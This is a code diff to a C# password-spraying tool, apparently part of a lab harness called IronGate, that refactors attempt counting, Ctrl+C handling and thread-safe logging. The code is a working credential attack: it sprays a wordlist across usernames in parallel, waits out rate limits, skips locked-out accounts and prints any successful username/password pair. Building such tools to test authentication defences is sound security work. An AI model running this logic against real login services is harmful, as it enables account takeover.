@@ -8,6 +8,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Net.Http;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
@@ -20,6 +21,21 @@ namespace IronGate.Cli.Attacks {
         private static int globalHttpAttempts;
         private static long totalRequestMs;
         private static double averageMsPerRequest;
+        private static bool TryReserveAttempt(int maxHttpAttempts, out int attemptNo) {
+            while (true) {
+                int current = Volatile.Read(ref globalHttpAttempts);
+                if (current >= maxHttpAttempts) {
+                    attemptNo = current;
+                    return false;
+                }
+
+                int next = current + 1;
+                if (Interlocked.CompareExchange(ref globalHttpAttempts, next, current) == current) {
+                    attemptNo = next; // unique for this request
+                    return true;
+                }
+            }
+        }
 
         internal static async Task RunAsync (HttpClient http,AuthConfigDto config,UserSeed seed,string usernamesFile,int threads) {
 
@@ -63,6 +79,21 @@ namespace IronGate.Cli.Attacks {
                 return;
             }
 
+            // aDDING a ctrl+c handler
+            using var cancelSource = new CancellationTokenSource();
+            void handler(object? s, ConsoleCancelEventArgs e) {
+                e.Cancel = true;
+                cancelSource.Cancel();
+            }
+            Console.CancelKeyPress += handler;
+
+            var started = Stopwatch.StartNew();
+            globalHttpAttempts = 0;
+            totalRequestMs = 0;
+            averageMsPerRequest = 0;
+
+            var terminalUsers = new ConcurrentDictionary<string, bool>(StringComparer.OrdinalIgnoreCase);
+
             // Our log file (different than brute force) - since many threads, its critical section too.
             var logPath = Path.Combine(baseDir, "spray_log.jsonl");
             using var log = new StreamWriter(logPath, append: true, Encoding.UTF8);
@@ -75,26 +106,11 @@ namespace IronGate.Cli.Attacks {
             Console.WriteLine($"Stop Conditions: AnySuccess/Runtime({maxRunTime.TotalSeconds}s)/HttpAttempts({maxHttpAttempts})");
             Console.WriteLine($"Log:  {logPath}");
 
-
-            var started = Stopwatch.StartNew();
-            globalHttpAttempts = 0;
-
-            var terminalUsers = new ConcurrentDictionary<string, bool>(StringComparer.OrdinalIgnoreCase);
-
-            // configure ctrl+c to stop
-            using var cancelSource = new CancellationTokenSource();
-            void handler(object s, ConsoleCancelEventArgs e) {
-                e.Cancel = true;
-                cancelSource.Cancel();
-            }
-            Console.CancelKeyPress += handler;
-
             try {
                 using var pwReader = new StreamReader(passwordList, Encoding.UTF8);
 
-                // The main logic continues until no passwords left, or we hit the limit
                 while (!pwReader.EndOfStream && !cancelSource.IsCancellationRequested) {
-                    
+
                     if (started.Elapsed > maxRunTime) {
                         Console.WriteLine("Stopped: Runtime limit reached.");
                         return;
@@ -111,7 +127,6 @@ namespace IronGate.Cli.Attacks {
                     password = password.Trim();
                     if (password.Length == 0) continue;
 
-                    // Since we use the same password for all users each round, we make the queue
                     var q = new ConcurrentQueue<string>();
                     foreach (var u in users) {
                         if (terminalUsers.ContainsKey(u)) continue;
@@ -121,26 +136,16 @@ namespace IronGate.Cli.Attacks {
                     if (q.IsEmpty)
                         break;
 
-                    // found = successful attempts
                     var found = new ConcurrentBag<(string user, string pass)>();
 
-                    // Now we do the task itself per worker
                     var tasks = new List<Task>(threads);
                     for (var i = 0; i < threads; i++) {
 
                         tasks.Add(Task.Run(async () => {
                             try {
-                                // We increment the attempts for each thread attempt
-                                Interlocked.Increment(ref globalHttpAttempts);
-                                var currentMsTime = Stopwatch.StartNew();
-
                                 while (!cancelSource.IsCancellationRequested) {
 
                                     if (started.Elapsed > maxRunTime) {
-                                        cancelSource.Cancel();
-                                        break;
-                                    }
-                                    if (Volatile.Read(ref globalHttpAttempts) >= maxHttpAttempts) {
                                         cancelSource.Cancel();
                                         break;
                                     }
@@ -151,35 +156,38 @@ namespace IronGate.Cli.Attacks {
                                     if (terminalUsers.ContainsKey(username))
                                         continue;
 
-                                    // Get the totp secret if this user has one
                                     seed.TotpSecrets.TryGetValue(username, out var totpSec);
                                     totpSec ??= string.Empty;
 
-                                    // If we get rate limited, we need to retry...therefor....ANOTHA LOOP
                                     while (!cancelSource.IsCancellationRequested) {
 
                                         if (started.Elapsed > maxRunTime) {
                                             cancelSource.Cancel();
                                             break;
                                         }
-                                        if (Volatile.Read(ref globalHttpAttempts) >= maxHttpAttempts) {
+
+                                        // Reserve ONE global attempt number for ONE request.
+                                        if (!TryReserveAttempt(maxHttpAttempts, out int attemptNo)) {
                                             cancelSource.Cancel();
                                             break;
                                         }
 
-                                        // The login action itself
                                         var args = new[] { "login", username, password, "-", "-" };
 
-                                        var (_, resp) = await Login.LoginAction(http,args,(groupSeed ?? string.Empty),totpSec).ConfigureAwait(false);
-                                        
-                                        // Calculate for average time
-                                        currentMsTime.Stop();
-                                        long ms = currentMsTime.ElapsedMilliseconds;
-                                        Interlocked.Add(ref totalRequestMs, ms);
-                                        long n = Interlocked.Increment(ref globalHttpAttempts);
+                                        var sw = Stopwatch.StartNew();
+                                        var (_, resp) = await Login.LoginAction(
+                                            http, args, (groupSeed ?? string.Empty), totpSec
+                                        ).ConfigureAwait(false);
+                                        sw.Stop();
 
-                                        if (resp != null) Printers.Log(Volatile.Read(ref globalHttpAttempts), log, username, password, resp, "spray");
-                                        // Parse final response (success/fail/rate limit/locked out)
+                                        Interlocked.Add(ref totalRequestMs, sw.ElapsedMilliseconds);
+
+                                        if (resp != null) {
+                                            lock (logLock) {
+                                                Printers.Log(attemptNo, log, username, password, resp, "spray");
+                                            }
+                                        }
+
                                         AuthAttemptDto? attempt = null;
                                         AuthResultCode? code = null;
 
@@ -191,18 +199,15 @@ namespace IronGate.Cli.Attacks {
                                         if (authAttempt)
                                             code = attempt!.Result;
 
-                                        // We continue on success, but we add the username/pass combination to the found list
                                         if (authAttempt && attempt!.Success) {
                                             found.Add((username, password));
                                         }
 
-                                        // Stop this username if locked out
                                         if (code == AuthResultCode.LockedOut) {
                                             terminalUsers[username] = true;
                                             break;
                                         }
 
-                                        // Rate limit handling
                                         if (code == AuthResultCode.RateLimited &&
                                             waitTimeSeconds.HasValue &&
                                             waitTimeSeconds.Value > 0) {
@@ -214,41 +219,30 @@ namespace IronGate.Cli.Attacks {
                                                 ).ConfigureAwait(false);
                                             }
                                             catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) {
-                                                // normal stop
                                                 break;
                                             }
 
                                             continue;
                                         }
 
-                                        // Normal fail -> next username (exit retry loop)
                                         break;
                                     }
                                 }
                             }
-                            catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) {
-                                // normal stop (success/runtime/attempts/ctrl+c)
-                            }
-                            catch (TaskCanceledException) when (cancelSource.IsCancellationRequested) {
-                                // normal stop
-                            }
+                            catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) { }
+                            catch (TaskCanceledException) when (cancelSource.IsCancellationRequested) { }
                         }, CancellationToken.None));
                     }
+
                     try {
                         await Task.WhenAll(tasks).ConfigureAwait(false);
                     }
-                    catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) {
-                        // normal stop
-                    }
-                    catch (TaskCanceledException) when (cancelSource.IsCancellationRequested) {
-                        // normal stop
-                    }
+                    catch (OperationCanceledException) when (cancelSource.IsCancellationRequested) { }
+                    catch (TaskCanceledException) when (cancelSource.IsCancellationRequested) { }
 
-                    // Print the found array
                     if (!found.IsEmpty) {
                         foreach (var (u, p) in found)
                             Console.WriteLine($"Success: {u} / {p}");
-
                     }
                 }
 
@@ -260,11 +254,12 @@ namespace IronGate.Cli.Attacks {
                     Console.WriteLine("Finished: Wordlist ended or all users became terminal.");
             }
             finally {
-                averageMsPerRequest = (double)totalRequestMs / globalHttpAttempts;
+                var total = Volatile.Read(ref globalHttpAttempts);
+                averageMsPerRequest = total > 0 ? (double)totalRequestMs / total : 0;
 
-                Printers.WriteJsonl(log, new {
-                    totalAverageMs = averageMsPerRequest
-                });
+                lock (logLock) {
+                    Printers.WriteJsonl(log, new { totalAverageMs = averageMsPerRequest });
+                }
                 Console.CancelKeyPress -= handler;
             }
         }
